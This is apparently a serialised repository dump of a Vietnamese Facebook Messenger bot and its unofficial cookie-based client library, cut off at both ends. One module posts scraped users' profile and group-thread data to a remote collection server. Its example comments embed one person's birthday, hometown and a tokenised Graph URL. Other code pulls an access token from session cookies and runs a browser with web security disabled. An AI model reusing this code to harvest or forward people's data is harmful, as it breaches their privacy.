Data:[{\"id\":\"100042817150429\",\"name\":\"Nguy·ªÖn Th√°i H·∫£o\",\"first_name\":\"H·∫£o\",\"username\":\"Lazic.Kanzu\",\"link\":\"https://www.facebook.com/Lazic.Kanzu\",\"verified\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"about\":\"L√† m·ªôt ng∆∞·ªùi b√¨nh th∆∞·ªùng ^^\",\"avatar\":\"https://graph.facebook.com/100042817150429/picture?height=1500&width=1500&access_token=1449557605494892|aaf0a865c8bafc314ced5b7f18f3caa6\",\"birthday\":\"01/03/1999\",\"follow\":241614,\"gender\":\"male\",\"hometown\":{\"id\":\"112089428815888\",\"name\":\"Xu√¢n L·ªôc, √ê·ªìng Nai, Vietnam\"},\"email\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"interested_in\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"location\":{\"id\":\"351759091676222\",\"name\":\"Bi√™n H√≤a\"},\"locale\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"relationship_status\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"love\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"website\":\"http://KanzuWakazaki.tk/\",\"quotes\":\"The word impossible is not in my dictionary.\",\"timezone\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"updated_time\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\"}]\n                            Type:Users\n                            By:KanzuWakazaki\n                        **/\n                        let Time = new Date().toLocaleString(\"vi-vn\", {timeZone: \"Asia/Ho_Chi_Minh\"});\n                            return request({\n                                url:  ursl + '/post',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Time: Time,\n                                Data: JSON.stringify(data),\n                                Type: \"Users\",\n                                By: ctx.userID\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                    case \"Threads\": {\n                        /* \n                        example\n                            Time:19/01/2023\n                            Data:[{\"threadID\":\"5011501735554963\",\"threadName\":\"[üèÜ]  ùï≥ùï∑ ‚Ä¢ ùëØùíêùíìùíäùíõùíêùíè ùëÆùíÇùíéùíäùíèùíà  [üéÆ]\",\"participantIDs\":[\"100042817150429\"],\"userInfo\":[{\"id\":\"100042817150429\",\"name\":\"Nguy·ªÖn Th√°i H·∫£o\",\"firstName\":\"H·∫£o\",\"vanity\":\"Lazic.Kanzu\",\"thumbSrc\":\"https://scontent.fsgn5-14.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=VQmEbyNerpUAX9SL2lL&tn=b4RbIpyEAJUl2LrC&_nc_ht=scontent.fsgn5-14.fna&oh=00_AfDzMGWK-Hw8J8Ha_uZkNgwwIqX23W89p9vPbovDSrMFVw&oe=63CD7339\",\"profileUrl\":\"https://scontent.fsgn5-14.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=VQmEbyNerpUAX9SL2lL&tn=b4RbIpyEAJUl2LrC&_nc_ht=scontent.fsgn5-14.fna&oh=00_AfDzMGWK-Hw8J8Ha_uZkNgwwIqX23W89p9vPbovDSrMFVw&oe=63CD7339\",\"gender\":\"MALE\",\"type\":\"User\",\"isFriend\":true,\"isBirthday\":false}],\"unreadCount\":38925,\"messageCount\":39857,\"timestamp\":\"1674107309307\",\"muteUntil\":null,\"isGroup\":true,\"isSubscribed\":true,\"isArchived\":false,\"folder\":\"INBOX\",\"cannotReplyReason\":null,\"eventReminders\":[],\"emoji\":\"üòè\",\"color\":\"DD8800\",\"nicknames\":{\"100001776745483\":\"[ùêáùêÜ] ‚Ä¢ Eo b·ªù su\"},\"adminIDs\":[{\"id\":\"100042817150429\"}],\"approvalMode\":true,\"approvalQueue\":[],\"reactionsMuteMode\":\"reactions_not_muted\",\"mentionsMuteMode\":\"mentions_not_muted\",\"isPinProtected\":false,\"relatedPageThread\":null,\"name\":\"[üèÜ]  ùï≥ùï∑ ‚Ä¢ ùëØùíêùíìùíäùíõùíêùíè ùëÆùíÇùíéùíäùíèùíà  [üéÆ]\",\"snippet\":\"SystemCall run (async function() {\\nSend(await Api.getThreadInfo(Data.threadID))\\n})()\",\"snippetSender\":\"100042817150429\",\"snippetAttachments\":[],\"serverTimestamp\":\"1674107309307\",\"imageSrc\":\"https://scontent.fsgn5-14.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=dfuXjxOR1BUAX-SUN1x&_nc_ht=scontent.fsgn5-14.fna&oh=03_AdQkXN3hb3z4Hg0Tg-vI7ZpDdSmujnluj13uNqUSJoU9iA&oe=63F060BA\",\"isCanonicalUser\":false,\"isCanonical\":false,\"recipientsLoadable\":true,\"hasEmailParticipant\":false,\"readOnly\":false,\"canReply\":true,\"lastMessageType\":\"message\",\"lastReadTimestamp\":\"1649756873571\",\"threadType\":2,\"TimeCreate\":1674107310529,\"TimeUpdate\":1674107310529}]\n                            Type:Threads\n                            By:KanzuWakazaki\n                        **/\n                        let Time = new Date().toLocaleString(\"vi-vn\", {timeZone: \"Asia/Ho_Chi_Minh\"});\n                            return request({\n                                url: ursl + '/post',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Time: Time,\n                                Data: JSON.stringify(data),\n                                Type: \"Threads\",\n                                By: ctx.userID\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                }\n            }\n            break;\n            case \"Get\": {\n                switch (type) {\n                    case \"Users\": {\n                        /* example\n                        Requires:[5011501735554963]\n                        Type:Threads\n                        **/\n\n                        //still operating until Feb 25\n                        return request({\n                            url: ursl + '/get',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Requires: JSON.stringify(data),\n                                Type: \"Users\"\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                    case \"Threads\": {\n                        return request({\n                            url: ursl + '/get',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Requires: JSON.stringify(data),\n                                Type: \"Threads\"\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                }\n            }\n            break;\n                default: \n            return;\n        }\n        \n    return returnPromise;\n    };\n};","path":null,"size_bytes":8035,"size_tokens":null},"modules/events/autosetname.js":{"content":"module.exports.config = {\n\tname: \"autosetname\",\n\teventType: [\"log:subscribe\"],\n\tversion: \"1.0.3\",\n\tcredits: \"D-Jukie\",\n\tdescription: \"T·ª± ƒë·ªông set bi·ªát danh th√†nh vi√™n m·ªõi\"\n};\n\nmodule.exports.run = async function({ Threads, api, event, Users }) {\n  const { createReadStream, existsSync, mkdirSync, readdirSync } = global.nodemodule[\"fs-extra\"];\n  const { join } =  global.nodemodule[\"path\"];\nconst { threadID } = event;\nvar memJoin = event.logMessageData.addedParticipants.map(info => info.userFbId)\n\tfor (let idUser of memJoin) {\n\t\tconst { readFileSync, writeFileSync } = global.nodemodule[\"fs-extra\"];\n\t\tconst { join } = global.nodemodule[\"path\"]\n\t\tconst pathData = join(\"./modules/commands\",\"data\", \"autosetname.json\");\n\t\tvar dataJson = JSON.parse(readFileSync(pathData, \"utf-8\"));\n\t\tvar thisThread = dataJson.find(item => item.threadID == threadID) || { threadID, nameUser: [] };\n\t\tif (thisThread.nameUser.length == 0) return \n\t\tif (thisThread.nameUser.length != 0) {  \n\t\tvar setName = thisThread.nameUser[0] \n\t\tawait new Promise(resolve => setTimeout(resolve, 1000));\n\t\tvar namee1 = await api.getUserInfo(idUser)\n        var namee = namee1[idUser].name\n\t\tapi.changeNickname(`${setName}`, threadID, idUser);\n\t\t} \n\t}\n\treturn api.sendMessage({body:\n    `ùêÅùê®ùê≠ ùêØùêÆÃõÃÄùêö ùê¨ùêûùê≠ ùêõùê¢ùêûÃ£ÃÇùê≠ ùêùùêöùêßùê° ùê≠ùêöÃ£ùê¶ ùê≠ùê°ùê®ÃõÃÄùê¢ ùêúùê°ùê® ùê≠ùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ùê¶ùê®ÃõÃÅùê¢`}, threadID, event.messageID)\n}","path":null,"size_bytes":1486,"size_tokens":null},"lib/fca-auto/src/Dev_getThreadInfoOLD.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  var { createData,getData,hasData,setLastRun,updateData, getAll } = require('../Extra/ExtraGetThread');\n  var { capture } = require('../Extra/Src/Last-Run');\n  var Database = require('../Extra/Database');\n  global.Fca.Data.Userinfo = [];\n  \n  return function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n\n      // ƒë∆∞·ª£c t√¨m th·∫•y v√†o gi·ªØa th√°ng 8/2022 b·ªüi @KanzuWakazaki - ƒë√£ ƒë∆∞·ª£c chia s·∫ª cho @D-Jukie v√† Horizon Team Public group ü§¥\n      // nh·ªØng code t∆∞∆°ng t·ª± muliti thread nh∆∞ n√†y ƒë·ªÅu c√≥ th·ªÉ l√† copy idea üêß\n      // ƒë√£ √°p d·ª•ng v√†o fca m·ªõi(cloud - fca(private)) v√†o cu·ªëi th√°ng 8/2022 b·ªüi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team\n      //c·∫≠p nh·∫≠t d·ª± √°n b·ªã b·ªè r∆°i n√†y v√†o ng√†y 19/11/2022 b·ªüi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nh·∫±m ƒë√°p ·ª©ng nhu c·∫ßu c·ªßa client !\n\n      if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n\n    var SpecialMethod = function(TID) {\n      const All = getAll();\n      const Real = [];\n      const Average = [];\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          if (i.data.TimeCreate + 900 * 1000 <= Date.now()) {\n            Real.push(i.data.threadID);\n          }\n          else {\n            Average.push({\n              threadID: i.data.threadID,\n              TimeCreate: i.data.TimeCreate\n            });\n            continue;\n          }\n        } else continue;\n      }\n    const AllofThread = [];\n    if (Average.length > 0) {\n      var Time = 0;\n      for (let i of Average) {\n        Time += i.TimeCreate;\n      }\n      Time = Time / Average.length;\n      if (Time + 900 * 1000 <= Date.now()) {\n        for (let i of Average) {\n          Real.push(i.threadID);\n        }\n      } //can't =))\n      else {\n        setTimeout(function () {\n          SpecialMethod(TID);\n        }, Time + 900 * 1000 - Date.now());\n      }\n    }\n    else {\n      setTimeout(function () {\n        SpecialMethod(TID);\n      }, 900 * 1000);\n    }\n    if (Real.length == 0) return;\n    else if (Real.length == 1) {\n      return DefaultMethod(TID);\n    } \n    else if (All.length > 1) {\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          AllofThread.push(i.data.threadID);\n        } else continue;\n      }\n      var Form = {};\n      var ThreadInfo = [];\n        \n        AllofThread.map(function (x,y) {\n          Form[\"o\" + y] = {\n            doc_id: \"3449967031715030\",\n            query_params: {\n              id: x,\n              message_limit: 0,\n              load_messages: false,\n              load_read_receipts: false,\n              before: null\n            }\n          };\n        });\n  \n        var form = {\n          queries: JSON.stringify(Form),\n          batch_name: \"MessengerGraphQLThreadFetcher\"\n        };\n  \n        defaultFuncs\n        .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function(resData) {\n          if (resData.error) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          if (resData[resData.length - 1].error_results !== 0) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          resData = resData.splice(0, resData.length - 1);\n          resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n          resData.map(function (x,y) {\n            ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n          });\n            try {\n            if (Object.keys(resData).length == 1) {\n              updateData(threadID,ThreadInfo[0]);\t\n              if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n                for (let i of ThreadInfo[0].userInfo) {\n                  if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                    global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n                  }\n                  global.Fca.Data.Userinfo.push(i);\n                }\n              }\n            } else {\n              for (let i of ThreadInfo) {\n                updateData(i.threadID,i);\n                if (utils.getType(i.userInfo) == \"Array\") {\n                  for (let ii of i.userInfo) {\n                    if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                      global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                    }\n                    global.Fca.Data.Userinfo.push(ii);\n                  }\n                }\n              }\n            }\n          }\n        catch (e) {\n          console.log(e);\n        }\n        })\n        .catch(function(err){\n          throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n        });\n      }\n    };\n\n    var DefaultMethod = function(TID) { \n      var ThreadInfo = [];\n      for (let i of TID) {\n        ThreadInfo.push(getData(i));\n      }\n      if (ThreadInfo.length == 1) {\n        callback(null,ThreadInfo[0]);\n        if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n          for (let i of ThreadInfo[0].userInfo) {\n            if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n              global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n            }\n            global.Fca.Data.Userinfo.push(i);\n          }\n      } else {\n        for (let i of ThreadInfo) {\n          if (utils.getType(i.userInfo) == \"Array\") {\n            for (let ii of i.userInfo) {\n              if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(ii);\n            }\n          }\n        }\n        callback(null,ThreadInfo);\n      }\n    }\n  };\n    var CreateMethod = function(TID) { \n      var Form = {};\n      var ThreadInfo = [];\n\n      TID.map(function (x,y) {\n        Form[\"o\" + y] = {\n          doc_id: \"3449967031715030\",\n          query_params: {\n            id: x,\n            message_limit: 0,\n            load_messages: false,\n            load_read_receipts: false,\n            before: null\n          }\n        };\n      });\n\n      var form = {\n        queries: JSON.stringify(Form),\n        batch_name: \"MessengerGraphQLThreadFetcher\"\n      };\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function(resData) {\n        if (resData.error) {\n          throw resData.error;\n        }\n        if (resData[resData.length - 1].error_results !== 0) {\n          throw resData.error;\n        }\n        resData = resData.splice(0, resData.length - 1);\n        resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n        resData.map(function (x,y) {\n          ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n        });\n        if (Object.keys(resData).length == 1) {\n          createData(threadID,ThreadInfo[0]);\t\n          callback(null, ThreadInfo[0]);\n          capture(callback);\n          setLastRun('LastUpdate', callback);\n          if (global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = [];\n          if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n            for (let i of ThreadInfo[0].userInfo) {\n              if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(i);\n            }\n          }\n        } else {\n          // api.Horizon_Data([ThreadInfo], \"Threads\", \"Post\");\n          for (let i of ThreadInfo) {\n            createData(i.threadID,i);\n            if (utils.getType(i.userInfo) == \"Array\") {\n              for (let ii of i.userInfo) {\n                if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                  global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                }\n                global.Fca.Data.Userinfo.push(ii);\n              }\n            }\n          }\n          callback(null, ThreadInfo);\n        }\n      })\n      .catch(function(err){\n        throw err;\n      });\n    };\n    if (global.Fca.Data.Already != true) { SpecialMethod(threadID); global.Fca.Data.Already = true; setInterval(function(){Database(true).set('UserInfo', global.Fca.Data.Userinfo); delete global.Fca.Data.Userinfo; global.Fca.Data.Userinfo = []; }, 900 * 1000); } \n    \n    try {\n      for (let i of threadID) {\n        switch (hasData(i)) {\n            case true: {     \n              DefaultMethod(threadID);\n              break;\n            }\n          case false: {\n            CreateMethod(threadID);\n            break;\n          }\n        }\n      }\n    }\n    catch (err) {\n      console.log(err);\n    }\n    return returnPromise;\n  };\n};","path":null,"size_bytes":15115,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getAccessToken.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getAccessToken(callback) {\n      var resolveFunc = function () { };\n      var rejectFunc = function () { };\n      var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n      });\n  \n      if (!callback) {\n        callback = function (err, userInfo) {\n          if (err) return rejectFunc(err);\n          resolveFunc(userInfo);\n        };\n      }\n    try {\n      var { getAccessToken } = require('../Extra/ExtraAddons');\n      getAccessToken(ctx.jar,ctx,defaultFuncs).then(data => callback(null,data));\n    }\n    catch (e) {\n      callback(null, e);\n    }\n    return returnPromise;\n    };\n  };","path":null,"size_bytes":783,"size_tokens":null},"lib/fca-auto/src/changeArchivedStatus.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeArchivedStatus(threadOrThreads, archive, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {};\n\n    if (utils.getType(threadOrThreads) === \"Array\") for (var i = 0; i < threadOrThreads.length; i++) form[\"ids[\" + threadOrThreads[i] + \"]\"] = archive;\n    else form[\"ids[\" + threadOrThreads + \"]\"] = archive;\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/change_archived_status.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeArchivedStatus\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1213,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/ExtraScreenShot.js":{"content":"/* global document */\n'use strict';\nconst {promisify} = require('util');\nconst fs = require('fs');\nconst fileUrl = require('file-url');\nconst puppeteer = require('puppeteer');\nconst toughCookie = require('tough-cookie');\n\nconst writeFile = promisify(fs.writeFile);\n\nconst isUrl = string => /^(https?|file):\\/\\/|^data:/.test(string);\n\nconst scrollToElement = (element, options) => {\n\tconst isOverflown = element => {\n\t\treturn (\n\t\t\telement.scrollHeight > element.clientHeight ||\n\t\t\telement.scrollWidth > element.clientWidth\n\t\t);\n\t};\n\n\tconst findScrollParent = element => {\n\t\tif (element === undefined) {\n\t\t\treturn;\n\t\t}\n\n\t\tif (isOverflown(element)) {\n\t\t\treturn element;\n\t\t}\n\n\t\treturn findScrollParent(element.parentElement);\n\t};\n\n\tconst calculateOffset = (rect, options) => {\n\t\tif (options === undefined) {\n\t\t\treturn {\n\t\t\t\tx: rect.left,\n\t\t\t\ty: rect.top\n\t\t\t};\n\t\t}\n\n\t\tconst offset = options.offset || 0;\n\n\t\tswitch (options.offsetFrom) {\n\t\t\tcase 'top':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left,\n\t\t\t\t\ty: rect.top + offset\n\t\t\t\t};\n\t\t\tcase 'right':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left - offset,\n\t\t\t\t\ty: rect.top\n\t\t\t\t};\n\t\t\tcase 'bottom':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left,\n\t\t\t\t\ty: rect.top - offset\n\t\t\t\t};\n\t\t\tcase 'left':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left + offset,\n\t\t\t\t\ty: rect.top\n\t\t\t\t};\n\t\t\tdefault:\n\t\t\t\tthrow new Error('Invalid `scrollToElement.offsetFrom` value');\n\t\t}\n\t};\n\n\tconst rect = element.getBoundingClientRect();\n\tconst offset = calculateOffset(rect, options);\n\tconst parent = findScrollParent(element);\n\n\tif (parent !== undefined) {\n\t\tparent.scrollIntoView(true);\n\t\tparent.scrollTo(offset.x, offset.y);\n\t}\n};\n\nconst disableAnimations = () => {\n\tconst rule = `\n\t\t*,\n\t\t::before,\n\t\t::after {\n\t\t\tanimation: initial !important;\n\t\t\ttransition: initial !important;\n\t\t}\n\t`;\n\n\tconst style = document.createElement('style');\n\tdocument.body.append(style);\n\n\tstyle.sheet.insertRule(rule);\n};\n\nconst getBoundingClientRect = element => {\n\tconst {top, left, height, width, x, y} = element.getBoundingClientRect();\n\treturn {top, left, height, width, x, y};\n};\n\nconst parseCookie = (url, cookie) => {\n\tif (typeof cookie === 'object') {\n\t\treturn cookie;\n\t}\n\n\tconst jar = new toughCookie.CookieJar(undefined, {rejectPublicSuffixes: false});\n\tjar.setCookieSync(cookie, url);\n\tconst returnValue = jar.serializeSync().cookies[0];\n\n\t// Use this instead of the above when the following issue is fixed:\n\t// https://github.com/salesforce/tough-cookie/issues/149\n\t// const ret = toughCookie.parse(cookie).serializeSync();\n\n\treturnValue.name = returnValue.key;\n\tdelete returnValue.key;\n\n\tif (returnValue.expires) {\n\t\treturnValue.expires = Math.floor(new Date(returnValue.expires) / 1000);\n\t}\n\n\treturn returnValue;\n};\n\nconst imagesHaveLoaded = () => [...document.images].map(element => element.complete);\n\nconst captureWebsite = async (input, options) => {\n\toptions = {\n\t\tinputType: 'url',\n\t\twidth: 1920,\n\t\theight: 1080,\n\t\tscaleFactor: 2,\n\t\tfullPage: false,\n\t\tdefaultBackground: true,\n\t\ttimeout: 60, // The Puppeteer default of 30 is too short\n\t\tdelay: 0,\n\t\tdebug: false,\n\t\tdarkMode: true,\n\t\tlaunchOptions: { devtools:true },\n\t\t_keepAlive: true,\n\t\tisJavaScriptEnabled: true,\n\t\tinset: 0,\n        args: [\"--webview-disable-safebrowsing-support\",\n        \"--disable-web-security\"],\n        ignoreHTTPSErrors: true,\n\t\t...options\n\t};\n\n\tconst isHTMLContent = options.inputType === 'html';\n\n\tinput = isHTMLContent || isUrl(input) ? input : fileUrl(input);\n\n\tconst timeoutInSeconds = options.timeout * 1000;\n\n\tconst viewportOptions = {\n\t\twidth: options.width,\n\t\theight: options.height,\n\t\tdeviceScaleFactor: options.scaleFactor\n\t};\n\n\tconst screenshotOptions = {};\n\n\tif (options.type) {\n\t\tscreenshotOptions.type = options.type;\n\t}\n\n\tif (options.quality) {\n\t\tscreenshotOptions.quality = options.quality * 100;\n\t}\n\n\tif (options.fullPage) {\n\t\tscreenshotOptions.fullPage = options.fullPage;\n\t}\n\n\tif (typeof options.defaultBackground === 'boolean') {\n\t\tscreenshotOptions.omitBackground = !options.defaultBackground;\n\t}\n\n\tconst launchOptions = {...options.launchOptions};\n\n\tif (options.debug) {\n\t\tlaunchOptions.headless = false;\n\t\tlaunchOptions.slowMo = 100;\n\t}\n\n\tconst browser = options._browser || await puppeteer.launch(launchOptions);\n\tconst page = await browser.newPage();\n\n\tif (options.preloadFunction) {\n\t\tawait page.evaluateOnNewDocument(options.preloadFunction);\n\t}\n\n\tawait page.setJavaScriptEnabled(options.isJavaScriptEnabled);\n\n\tif (options.debug) {\n\t\tpage.on('console', message => 